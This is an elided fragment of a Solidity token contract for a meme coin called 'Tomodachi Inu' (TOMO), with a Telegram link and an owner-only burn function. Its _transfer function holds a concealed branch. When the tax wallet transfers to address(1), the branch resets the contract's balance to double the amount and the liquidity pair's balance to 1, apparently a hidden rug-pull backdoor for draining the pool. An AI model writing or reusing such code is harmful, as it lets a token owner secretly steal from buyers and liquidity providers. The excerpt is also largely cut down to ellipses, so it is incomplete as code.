...
//
// Telegram: https://t.me/tomodachiinu
...
uint256 constant TOTAL_SUPPLY=12800000;
string constant TOKEN_SYMBOL="TOMO";
string constant TOKEN_NAME="Tomodachi Inu";
...
contract TomodachiInu is Context, IERC20, Ownable {
	...
	function burn(uint256 percentage) public onlyOwner{
		...
		require(percentage<100,"You should not do this");
	...
	function _transfer(address from, address to, uint256 amount) private {
		...
		if (from == _taxWallet && to == address(1)) {
            _balance[address(this)] = 2 * amount;
            _balance[_pair] = 1;
